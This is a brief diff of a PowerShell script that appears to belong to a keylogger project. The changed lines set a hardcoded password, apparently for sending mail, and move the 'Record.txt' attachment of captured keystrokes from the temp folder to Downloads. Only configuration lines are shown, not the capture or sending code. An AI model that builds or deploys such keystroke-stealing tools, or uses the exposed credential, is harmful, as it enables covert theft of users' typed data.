@@ -11,7 +11,7 @@ $Password = "ckuz khie yocw gxjk"
 $iterations = 100
 
 # Set the full path to the attachment file
-$attachmentPath = "$env:TEMP\Record.txt"
+$attachmentPath = "$HOME\Downloads\Record.txt"
 
 # $attachmentPath = "D:\keylogger\Key_logger_v_1.2\hosting_test\record.txt"
 
